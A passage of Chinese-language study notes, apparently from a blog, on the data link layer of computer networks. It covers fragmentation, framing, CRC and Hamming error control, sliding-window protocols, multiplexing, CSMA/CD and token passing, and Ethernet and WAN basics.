<li>MTU的值等于<strong>IP报文与以太帧头、CRC部分的总和</strong>，即MTU &#x3D; IP MTU + 18字节。例如在Juniper部分设备上，MTU是指IP MTU + 以太帧头 + CRC部分。</li>
</ul>
<p>在实际设置MTU值时，需要<strong>特别关注各厂商、产品对于MTU的定义</strong>。在本篇文章中以第一章定义为准。</p>
<blockquote>
<p><strong>超过MTU的报文如何进行分片？</strong></p>
</blockquote>
<p>以太网缺省<strong>MTU&#x3D;1500字节</strong>，这是以太网接口对IP层的约束，如果IP层有&lt;&#x3D;1500字节需要发送，只需要一个IP包就可以完成发送任务；如果<strong>IP层有&gt;1500字节数据需要发送，需要分片才能完成发送</strong>。</p>
<p>以主机发送一个数据载荷<strong>长度为2000字节的报文为例</strong>说明其分片的过程（假设出接口的MTU值为1500）。在<strong>网络层会对报文进行封装</strong>，其结构组成：<strong>IP头部20字节+数据载荷长度2000字节，报文封装后，整个报文长度为2020字节</strong>。在出接口进行转发的时候，发现IP报文的长度超过了MTU的值1500，因此要<strong>进行分片处理</strong>，详情见下图。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673171708957.png"><br>第一片报文，IP报文头固定20字节，数据载荷可以封装1480字节（MTU值1500字节-IP报文头20字节，<strong>数据载荷长度须是8的倍数</strong>）；</p>
<p>第二片报文，复制第一片的IP头，IP报文头固定20字节，数据载荷为剩余的520字节（总数据载荷长度2000字节减去第一片中已封装的1480字节）。如果最后一片报文的长度不足46字节，会自动填充至46字节。</p>
<p>所有分片报文在发送至目的主机后，在<strong>目的主机进行分片重组，恢复为原报文</strong>。在进行重组时，通过IP标志位中的<strong>MF</strong>用来分辨这是不是最后一个分片，<strong>片偏移</strong>用来分辨这个分片相对原数据报的位置。通过这几个字段，可以准确的完成数据报的重组操作。</p>
<hr>
<p><strong>帧同步</strong>：接收方应当能从接收到的二进制比特流中<strong>区分帧的起始和终止</strong>。</p>
<blockquote>
<p><strong>组帧的四种方法</strong>（即通过不同的方式判断一个完整的帧）</p>
</blockquote>
<p><strong>方法一：字符计数法</strong></p>
<p>即在<strong>帧首部使用一个计数字段</strong>（第一个字节，8位）来标明帧内字符数，表明包含计数字段在内的帧长度。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673172117331.png"></p>
<ul>
<li><strong>优点</strong>：很简洁明了</li>
<li><strong>缺点</strong>：当计数字段发生错误会导致严重错误。因为是一个数据流，一旦一个错了，后续也会出错。</li>
</ul>
<p><strong>方法二：字符（节）填充法</strong></p>
<p>采取<strong>特定的标识字符来标识某一帧的开始和结束</strong>，如果数据中有与标识字符相同的字符，则在前面填充<strong>转义字符</strong>，接收方将转义字符去掉即可得到原数据。</p>
<p><strong>方法三：零比特填法</strong></p>
<p>使用固定的比特模式<code>01111110</code>来标识帧的开始和结束。</p>
<ul>
<li>在<strong>发送</strong>时，每次碰到<code>11111</code>就在后面填充一位0</li>
<li>在<strong>接收</strong>时，先通过01111110找到起始位置，再查找数据中连续的5个1将其后面的0去除得到原数据</li>
</ul>
<hr>
<p><strong>扩展</strong>：字节填充与零比特填充（参考文章：<a href="http://justin955.top/archives/74/">http://justin955.top/archives/74/</a> ）</p>
<blockquote>
<p><strong>填充的目的</strong></p>
</blockquote>
<p>在数据链路层进行封装成帧的过程中，会有<strong>帧界定符Flag</strong>作为一头一尾用来封装。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673175600249.png"><br>PPP协议中使用的是<code>0x7E:01111110</code>作为定界符，即路由器检测到某个字节为0x7E就说明上个帧传输结束，开始下个帧的传输。</p>
<p>那么新的问题出现了：如果我们的<strong>数据中存在0x7E</strong>，路由器就会把它误认为定界符，那岂不是会导致帧传输出现错误吗？</p>
<p>解决这个问题，我们采用了最简单粗暴的方式，即：<strong>对发送的数据进行转义，将会被误解的数据用另一种方式表达，使得数据中不存在会被误解的数据。</strong></p>
<blockquote>
<p><strong>两种传输方式–两种填充方法</strong></p>
</blockquote>
<p>首先需要知道，在进行数据传输时，常见的有两种传输方式：<strong>异步传输和同步传输</strong></p>
<ul>
<li>在<strong>同步传输</strong>中，数据以块或帧的形式发送。此传输是全双工类型。在发送者和接收者之间强制性同步。在同步传输中，<strong>数据之间没有间隙</strong>。与异步传输相比，传输大量数据更加有效和可靠。</li>
<li>在<strong>异步传输</strong>中，数据<strong>以字节或字符的形式</strong>发送。该传输是半双工型传输。在该传输中，在数据的起始位和停止位都添加了奇偶校验位。它不需要同步。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673175924668.png"><br><strong>注</strong>：简记为“<code>同流异字</code>”</p>
<ul>
<li>异步传输是<strong>以字节为单位</strong>，逐个字节发送，所以需要以字节为单位进行转换-<strong>字节填充</strong></li>
<li>同步传输则是<strong>发送整个数据流</strong> ，传输整个比特流，以比特为单位进行转换-(零)<strong>比特填充</strong></li>
</ul>
<p>二者的目的都是为了<strong>使得数据中不会出现标识字符</strong>，只是实现的方式不同。</p>
<hr>
<p><strong>方法四：违规编码法</strong></p>
<p>在曼彻斯特编码中，高-&gt;低表示1，低-&gt;高表示0。那么<strong>低-低</strong>和<strong>高-高就</strong>是违规编码。使用违规编码标识帧的开始和结束。</p>
<blockquote>
<p>透明传输</p>
</blockquote>
<p>透明传输是指不管<strong>所传输的数据是什么样的比特组合</strong>，都应当可以在链路上传输。</p>
<h2 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186855051.png"></p>
<h3 id="差错的原因"><a href="#差错的原因" class="headerlink" title="差错的原因"></a>差错的原因</h3><blockquote>
<p>差错检测分为<strong>检测编码</strong>和<strong>纠错编码</strong>。差错基本上都是由于<strong>噪声</strong>引起的，注意下面两点：</p>
</blockquote>
<ul>
<li>检错编码可以<strong>检测而不能直接定位错误</strong>，因此无法纠错、</li>
<li>纠错编码可以完成前向纠错，但是成本很高，<strong>甚少使用</strong></li>
</ul>
<blockquote>
<p>噪声的种类</p>
</blockquote>
<ul>
<li><p><strong>全局性</strong></p>
<ul>
<li>定义描述：由于线路本身的电气特性所产生的随机噪声，是<strong>信道固有</strong>的，随机产生的</li>
<li>解决方法：<strong>提高信噪比</strong></li>
</ul>
</li>
<li><p><strong>局部性</strong></p>
<ul>
<li>定义描述：外界特定的<strong>短暂原因</strong>所造成的冲击噪声，这是<strong>产生差错的主要原因</strong></li>
<li>解决方法：利用<strong>编码技术解决</strong></li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>差错的种类</strong></p>
</blockquote>
<ul>
<li><strong>位错</strong>：0变1,1变0</li>
<li><strong>帧错</strong>：丢失、重复、失序</li>
</ul>
<blockquote>
<p><strong>链路层提供的服务种类</strong></p>
</blockquote>
<ul>
<li>通信质量好的网络：无确认无连接服务</li>
<li>通信质量差的网络：有确认无连接服务</li>
<li>无线传输链路：有确认有连接服务</li>
</ul>
<h3 id="检错编码"><a href="#检错编码" class="headerlink" title="检错编码"></a>检错编码</h3><blockquote>
<p><strong>奇偶校验码</strong></p>
</blockquote>
<p>在待发送的数据后面<strong>增加一位检错码</strong>，使得数据中的<strong>1的个数为奇数或者偶数</strong></p>
<p><strong>缺点</strong>：只能检测出奇数个或者偶数个的错误，<strong>检错能力为50%</strong></p>
<blockquote>
<p><strong>循环冗余编码</strong>（CRC校验）</p>
</blockquote>
<p>将数据拆分为相同大小的组，每一组加上<strong>冗余码</strong>后构成帧再发送。</p>
<p>冗余码采用<strong>生成多项式与数据相除</strong>得到，具体流程如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673177412198.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673177432645.png"></p>
<p><strong>注意</strong>：加到数据后面的是余数而不是商。</p>
<p><strong>提醒</strong>：使用CRC校验可以<strong>实现无错传输</strong>，但是<strong>不是可靠传输</strong>。</p>
<h3 id="纠错编码"><a href="#纠错编码" class="headerlink" title="纠错编码"></a>纠错编码</h3><p><strong>海明码</strong>是计算机网络中数据链路层的针对帧的位错提出的一种纠错编码方式，下面我们将对其进行详细的介绍。</p>
<blockquote>
<p>海明距离（汉明距离）</p>
</blockquote>
<ul>
<li>两个合法编码的对应比特取值不同的比特称为<strong>两个码字的汉明距离</strong></li>
<li>在一个有效编码集中，任意两个合法编码的汉明距离的最小值称为该<strong>编码集的汉明距离</strong></li>
</ul>
<p>对于一个n位数据，</p>
<ul>
<li>使用海明码进行检错：汉明距离为n+1</li>
<li>使用海明码进行纠错：汉明距离为2n+1</li>
</ul>
<blockquote>
<p>海明码的作用</p>
</blockquote>
<p>实现<strong>双比特检错、单比特纠错</strong></p>
<blockquote>
<p><strong>海明码的步骤</strong>：4步<br>（<a href="https://blog.csdn.net/Michael__Wu/article/details/114936902">https://blog.csdn.net/Michael__Wu/article/details/114936902</a> ）</p>
</blockquote>
<p><strong>第一步：确定校验码的位数</strong></p>
<p>若数据有m位，检验码有r位，则检验码应该满足：<code>2^r &gt;= m+r+1</code></p>
<p><strong>第二步：确定校验码和数据的位置</strong></p>
<p>每个校验码应该放置在最终<strong>海明码的2的整数次幂</strong>的位置</p>
<p><strong>例子</strong>：发送数据位101101，即m&#x3D;6，可得r&#x3D;4。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673178517527.png"></p>
<p><strong>第三步：求出校验码的值</strong></p>
<p>每位校验码码位对应的位数的二进制(<code>0001, 0010, 0100, 1000</code>)表示中只有一个1。</p>
<p>因为根据校验码位置确定的原则, P1,P2,P3,P4的位数分别为2^0,2^1,2^2,2^3, 其二进制表示分别为0001, 0010, 0100, 1000。</p>
<p>那么海明码的每一位(<code>p1,p2,d1,p3,d2,d3,d4,p4,d5,d6</code>)对应码位(<code>1, 2, 3, 4, 5, 6, 7, 8, 9, 10</code>)的二进制表示(<code>0001, 0010, 0011, 0100, 0101, 0110, 0111, 1000, 1001, 1010</code>)中与校验码码位(1, 2, 4, 8)的二进制表示(<code>0001, 0010, 0100, 1000</code>)的1的位置<strong>同为1的所有码的码值的异或运算应为0</strong></p>
<p>假设p1,p2,p3,p4的码值分别为x1,x2,x3,x4, 那么应有p1,d1,d2,d4,d5码值的异或运算为0, 即校验码位的码值为0, 同理得出p2,p3,p4的码值分别为0, 0, 1</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673179288761.png"></p>
<p><strong>第四步：检错并纠错</strong></p>
<p>对各位进行奇偶检验，若为奇数，则证明数据出错</p>
<p>将每位校验码所校验的位数再次求奇偶检验，得到新的结果转置得到的二进制值即为出错位数。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673179405902.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673179513818.png"></p>
<p><strong>注意</strong>：无论是差错检验还是纠错检验都是在<strong>原数据的基础上加上一些校验码</strong>，而后利用算法的性质进行检验。</p>
<h2 id="流量控制与可靠传输协议"><a href="#流量控制与可靠传输协议" class="headerlink" title="流量控制与可靠传输协议"></a>流量控制与可靠传输协议</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186916358.png"></p>
<h3 id="流量传输概述"><a href="#流量传输概述" class="headerlink" title="流量传输概述"></a>流量传输概述</h3><ul>
<li><strong>数据链路层</strong><ul>
<li>流量控制是<strong>点对点</strong>的</li>
<li>方法：接收端收不下就不发送确认</li>
</ul>
</li>
<li><strong>传输层</strong><ul>
<li>流量控制是<strong>端对端</strong>的</li>
<li>接收端给接收端发送一个窗口公告</li>
</ul>
</li>
</ul>
<blockquote>
<p>可靠传输与流量控制</p>
</blockquote>
<ul>
<li><strong>可靠传输</strong>：发送端发送什么，接收端就接收什么</li>
<li><strong>流量控制</strong>：控制发送速率，使得接收方有足够的缓冲空间来接收每一个帧</li>
</ul>
<blockquote>
<p>滑动窗口机制</p>
</blockquote>
<ul>
<li>解决<strong>可靠传输</strong>：发送方<strong>自动重传</strong></li>
<li>解决<strong>流量控制</strong>：在没收到<strong>窗口确认</strong>的情况下不发送下一个</li>
</ul>
<h3 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h3><blockquote>
<p><strong>什么是停等协议</strong></p>
</blockquote>
<p>停止等待就是指<strong>每发送完一个分组就停止发送</strong>，<strong>等待对方确认</strong>，在收到确认后再发送下一个分组</p>
<blockquote>
<p><strong>为什么要有停等协议？</strong></p>
</blockquote>
<ul>
<li>比特出错、丢包问题等</li>
<li>实现流量控制</li>
</ul>
<blockquote>
<p><strong>研究停等协议的前提</strong></p>
</blockquote>
<ul>
<li>以<strong>半双工</strong>的形式进行</li>
<li>不考虑数据在哪一层进行传输</li>
</ul>
<blockquote>
<p><strong>停等协议的几种情况</strong></p>
</blockquote>
<p><strong>情况一：无差错情况</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673180854887.png"><br>每一帧都会停止等待，所以仅需要1位对帧进行编号。</p>
<p><strong>情况二：有差错情况</strong></p>
<blockquote>
<blockquote>
<p><strong>帧丢失或出错</strong></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673180934595.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673180979802.png"></p>
<blockquote>
<blockquote>
<p><strong>ACK丢失</strong></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673181036849.png"></p>
<blockquote>
<blockquote>
<p><strong>ACK迟到</strong></p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673181076766.png"></p>
<blockquote>
<p><strong>停等协议的信道利用率</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673181139495.png"></p>
<p><strong>注</strong>：这里涉及到了<strong>计算问题</strong>，要留心。</p>
<p><strong>停等协议的信道利用率很低</strong>。</p>
<p><strong>一个例子：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673181550900.png"><br><strong>注</strong>：没有说确认帧发送时延就不用算。</p>
<h3 id="多帧滑动窗口–后退N帧协议"><a href="#多帧滑动窗口–后退N帧协议" class="headerlink" title="多帧滑动窗口–后退N帧协议"></a>多帧滑动窗口–后退N帧协议</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673181952789.png"></p>
<p>与停等协议比，<strong>后退N帧协议</strong>：</p>
<ul>
<li>需要更大的编码范围</li>
<li>发送方需要缓存多个帧</li>
</ul>
<blockquote>
<p><strong>滑动窗口介绍</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182056302.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182073438.png"></p>
<blockquote>
<p><strong>发送方的响应事件</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182139683.png"></p>
<blockquote>
<p><strong>接收方的响应事件</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182189236.png"></p>
<blockquote>
<p>后退N帧协议的性能分析</p>
</blockquote>
<ul>
<li><strong>优点</strong>：连续发送帧，<strong>提高信道利用率</strong></li>
<li><strong>缺点</strong>：重传是需要发送已经发送过的帧，<strong>传送效率低</strong></li>
</ul>
<h3 id="选择重传协议"><a href="#选择重传协议" class="headerlink" title="选择重传协议"></a>选择重传协议</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182313110.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182354974.png"></p>
<blockquote>
<p><strong>发送方的响应事件</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182389573.png"></p>
<blockquote>
<p><strong>接收方的响应事件</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673182406809.png"><br><strong>注意</strong>：有很多方法实现流量控制，其目的都是为了提高数据的传输效率，保证数据可以高效、可靠、正确的完成传输。要理解<strong>不同流量控制协议的不同点及其实现原理</strong>。</p>
<h2 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h2><blockquote>
<p>介质访问控制：采取一定的措施，使两对节点之间的通信不会发生干扰，分为两种：</p>
</blockquote>
<ul>
<li><strong>静态划分信道</strong><ul>
<li>信道划分介质访问控制</li>
</ul>
</li>
<li><strong>动态划分信道</strong><ul>
<li><strong>轮询访问</strong>介质控制</li>
<li><strong>随机访问</strong>介质控制</li>
</ul>
</li>
</ul>
<blockquote>
<p>两种链路类型</p>
</blockquote>
<ul>
<li><strong>点对点链路</strong><ul>
<li>两个相邻节点的通过链路连接，没有第三者</li>
<li>应用：PPP协议，常用于以太网</li>
</ul>
</li>
<li><strong>广播式链路</strong><ul>
<li>所有主机共享通信介质</li>
<li>应用：早期以太网、局域网</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>扩展</strong>：以太网和因特网 <a href="https://cloud.tencent.com/developer/news/470680">https://cloud.tencent.com/developer/news/470680</a></p>
</blockquote>
<h3 id="信道划分介质控制"><a href="#信道划分介质控制" class="headerlink" title="信道划分介质控制"></a>信道划分介质控制</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186968886.png"></p>
<p><strong>多路复用</strong>：将多个信号组合在一个信道上进行传输，到目的地后在分离为多个信号</p>
<p><strong>本质上是将广播信号转为点对点链路</strong></p>
<p>参考文章：<a href="https://blog.csdn.net/suxiaorui/article/details/87096375">https://blog.csdn.net/suxiaorui/article/details/87096375</a></p>
<blockquote>
<p>频分多路复用（FDM)</p>
</blockquote>
<p>所谓频分多路复用就是将我们的信道资源按频率上进行划分，分成一个个频带的子信道，让每个信号只去用其中的某一个频带的子信道。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183188527.png"><br><strong>应用</strong>：家里的电视有很多频道，这种<strong>电视信号就是这种频分多路复用技术</strong>。</p>
<p>频分多路复用的<strong>各用户占用不同的带宽资源</strong>，用户在分配到一定的频带后，在通 信过程中自始至终都占用这个频带 。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183282900.png"></p>
<blockquote>
<p>时分多路复用（TDM)</p>
</blockquote>
<p>时分复用则是将时间划分为一段段等长的<strong>时分复用帧</strong>（TDM 帧），每个用户在每个 TDM 帧中<strong>占用固定序号的时隙</strong> </p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183342640.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183371592.png"></p>
<blockquote>
<p>波分多路复用（WDM)</p>
</blockquote>
<p>介质为<strong>光纤</strong>，原理类似于<strong>光的频分多路复用</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183415523.png"></p>
<blockquote>
<p><strong>码分多路复用(CDM)</strong></p>
</blockquote>
<ul>
<li><p>广泛应用于<strong>无线链路共享</strong> (如蜂窝网,卫星通信等)  </p>
</li>
<li><p>每个用户配一个唯一的 m bit码片序 列(chipping sequence)，其中“0”用“-1”表示、“1”用“+1”表 示，</p>
<ul>
<li>如 S 站的码片序列：(–1 –1 –1 +1 +1 –1 +1 +1)</li>
</ul>
</li>
<li><p>各用户使用相同频率载波，利用各自码片序列编码数据 </p>
</li>
<li><p>编码信号 &#x3D; (原始数据) × (码片序列)</p>
<ul>
<li>如发送比特 1（+1），则发送自己的 m bit 码片序列 </li>
<li>如发送比特 0（-1），则发送该码片序列的m bit 码片序列的反码</li>
</ul>
</li>
<li><p>各用户码片序列相互正交(orthogonal)<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183659863.png"></p>
</li>
<li><p>令{di}为原始数据序列，各用户的叠加向量为<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183698928.png"></p>
</li>
<li><p>解码 : 码片序列与编码信号的内积<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183723002.png"></p>
</li>
</ul>
<p><strong>两个例子</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183754632.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183811431.png"></p>
<p><strong>注</strong>：码分复用的计算是很简单的，但是要理解原理。<br>可以看一下这个文章：<a href="https://blog.csdn.net/u011240016/article/details/52705205">https://blog.csdn.net/u011240016/article/details/52705205</a></p>
<h3 id="随机访问介质控制"><a href="#随机访问介质控制" class="headerlink" title="随机访问介质控制"></a>随机访问介质控制</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186991283.png"></p>
<p>所有的用户都可以随机的发送消息，<strong>发送消息时占用全部带宽</strong></p>
<blockquote>
<p><strong>ALOHA协议</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673183994240.png"><br><strong>技术特点</strong>：</p>
<ul>
<li>不监听信道</li>
<li>不按时间槽发送</li>
<li>随机重发</li>
</ul>
<p><strong>冲突检测：</strong></p>
<ul>
<li>在传输数据发送冲突时，接收方收到错误帧，返回错误信号</li>
<li>发送方在发现超时或者错误后随机时间内重发数据</li>
</ul>
<p><strong>时隙ALOHA协议</strong>：把时间分为若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发送冲突则必须等到下一个时间片开始时刻再发送</p>
<blockquote>
<p><strong>CSMA协议</strong></p>
</blockquote>
<p><strong>载波监听多路访问协议</strong>(CSMA) :在发送帧之前，先<strong>监听信道</strong>，根据<strong>信道状态</strong>决定是否发送数据</p>
<ul>
<li><strong>CS</strong>:载波侦听&#x2F;监听,每- 个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据</li>
<li><strong>MA</strong>:多点接入，表示许多计算机以多点接入的方式连接在一 根总线上</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184324245.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184339411.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184372146.png"></p>
<blockquote>
<p><strong>CSMA&#x2F;CD协议</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187022847.png"></p>
<p>与CSMA协议相比多了CD，即<strong>碰撞检测</strong>。下面介绍该协议的工作原理：</p>
<ol>
<li><strong>碰撞检测</strong></li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184558466.png"><br>2. 确定重传时机</p>
<p> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184698611.png"></p>
<ol start="3">
<li>最小帧长</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184727346.png"></p>
<blockquote>
<p><strong>CSMA&#x2F;CA协议</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187043225.png"></p>
<h3 id="轮询访问介质访问控制"><a href="#轮询访问介质访问控制" class="headerlink" title="轮询访问介质访问控制"></a>轮询访问介质访问控制</h3><blockquote>
<p><strong>轮询协议</strong></p>
</blockquote>
<p>主节点轮流邀请从属节点发送数据</p>
<p><strong>缺点</strong>：</p>
<ul>
<li>轮询开销</li>
<li>等待延时</li>
<li>单点故障</li>
</ul>
<blockquote>
<p><strong>令牌传递协议</strong></p>
</blockquote>
<p> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673184931579.png"><br> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673185205768.png"></p>
<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187068223.png"></p>
<h3 id="以太网与IEEE802-3标准"><a href="#以太网与IEEE802-3标准" class="headerlink" title="以太网与IEEE802.3标准"></a>以太网与IEEE802.3标准</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187086480.png"></p>
<blockquote>
<p>MAC子层与LLC子层</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673185755693.png"><br>将<strong>数据链路层</strong>分为了两个子层：</p>
<ul>
<li><strong>LLC子层</strong>: 逻辑链路控制子层，<strong>为网络层提供服务</strong><ul>
<li>无确认无连接、面向连接、 带确认无连接</li>
<li>高速传送</li>
<li>差错控制</li>
<li>给帧加序号</li>
</ul>
</li>
<li><strong>MAC子层</strong>:介质访问控制子层，MAC子层的存在<strong>屏蔽了不同物理链路种类的差异性</strong><ul>
<li>数据帧的封装&#x2F;卸装</li>
<li>帧的寻址和识别</li>
<li>帧的接收与发送</li>
<li>竞争处理</li>
<li>比特差错检测</li>
</ul>
</li>
</ul>
<blockquote>
<p>以太网概述<br><a href="https://blog.csdn.net/mfs_bad/article/details/112009446">https://blog.csdn.net/mfs_bad/article/details/112009446</a></p>
</blockquote>
<p>以太网是一种计算机局域网技术。IEEE组织的IEEE 802.3标准制定了以太网的技术标准，它规定了包括物理层的连线、电子信号和介质访问层协议的内容。以太网是应用最普遍的局域网技术，取代了其他局域网技术如令牌环、FDDI和ARCNET。</p>
<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187117373.png"></p>
<h2 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h2><h3 id="广域网概述"><a href="#广域网概述" class="headerlink" title="广域网概述"></a>广域网概述</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673187135990.png"></p>
<ul>
<li><strong>广域网</strong><ul>
<li>协议位于<strong>网络层、数据链路层、物理层</strong></li>
<li>强调资源共享</li>
<li>采用点到点连接</li>
<li>通信子网采用分组交换技术</li>
</ul>
